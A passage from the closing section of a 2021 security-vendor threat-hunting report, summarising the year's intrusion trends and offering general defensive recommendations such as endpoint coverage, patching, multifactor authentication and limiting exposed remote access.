organizations as they raced to adopt work-from-home practices and
adapt to constraints imposed by the rapidly escalating COVID-19 crisis.
Unfortunately, the 12 months that followed offered little in the way of reprieve
for defenders. The past year was marked by some of the most significant and
widespread cyberattacks the world has experienced.
OverWatch saw interactive intrusion activity continue at record levels. Both eCrime
and targeted intrusion adversaries continued to evolve and mature their tradecraft,
finding new ways to ensnare their victims.
The threat of eCrime still looms large, and adversaries have been seen exploiting
many avenues to gain access to victim environments — whether directly or by
leveraging access brokers. In addition, once they gain access, eCrime adversaries
are proving to be adept at quickly moving through victim networks, as evidenced by
short breakout times. (In more than a third of cases where OverWatch saw eCrime
adversaries break out, they were able to move laterally in under 30 minutes.)
Targeted intrusion adversaries are also showing no signs of slowing. The
telecommunications industry in particular has been hard hit, seeing intrusion
attempts more than double and accounting for 40% of all targeted intrusion activity
that OverWatch observed. The mass exploitation of Microsoft Exchange server
vulnerabilities also stood out as a low point, and as a timely reminder of both the
capabilities state-nexus adversaries have at their disposal and the ever-present threat
of new vulnerabilities being found and exploited.
Amidst all this, OverWatch remains vigilant, providing its customers with the
around-the-clock coverage needed to weather the ups and downs of the past
12 months and into the future. The defensive recommendations that follow draw on
the insights gleaned from threat hunters going head-to-head with adversaries every
day of the past year.

Recommendations
	
Roll it out. OverWatch is seeing adversaries become increasingly adept at identifying
the blind spots in organizations’ security coverage. It is crucial that full endpoint
protection including NGAV and EDR is deployed across all endpoints. A significant
number of intrusion attempts observed by OverWatch originate from hosts without
Falcon sensor coverage, giving adversaries an opportunity to operate in the shadows.
Protecting your most valuable assets requires visibility across all of your assets.
 urn it on. It is crucial to have comprehensive security countermeasures and to
T
enable the prevention capabilities in the products you use. If security solutions are
in place, but not configured to provide the proper level of protection, you’re giving
the adversary a head start.
 e vigilant and ready to act. Adversaries are continuing to find new ways to
B
breach organizations and can move laterally in just minutes. Defenders must
hunt around-the-clock and must be ready to act within minutes. Top-quality
managed services such as OverWatch and Falcon Complete provide the expertise,
resources and coverage to augment your existing team.

55

2021 Threat Hunting Report

	
Practice good hygiene. As a baseline, your organization should establish control
over the software running in your environment and eliminate unneeded software.
It is also crucial to ensure that your environment is kept up-to-date with the latest
patches.
	
Protect your identity. Valid accounts provide adversaries with access that is
easy to use and difficult to discern from legitimate activity. The best defense
is to stop valid credentials from falling into the wrong hands in the first place.
Organizations should avoid the use of default accounts and establish and
enforce strong password policies, including the use of multifactor authentication.
It is also important not to store sensitive or credential-related information in
unencrypted files. To mitigate against the impacts of adversaries’ use of valid
accounts, defenders should employ the principle of least privilege and routinely
monitor authentication logs, account creation and changes in user privileges.
 ay close attention to remote access. The use of legitimate, non-native remote
P
access tools such as TeamViewer, AnyDesk or VNC (and its variants) by eCrime
actors is common. Defenders should restrict and audit the use of such tools in
their environment, even for authorized use cases. Many common exploit attempts
can be prevented by not exposing SMB and RDP ports to the internet. Any
externally accessible services should be closely monitored.
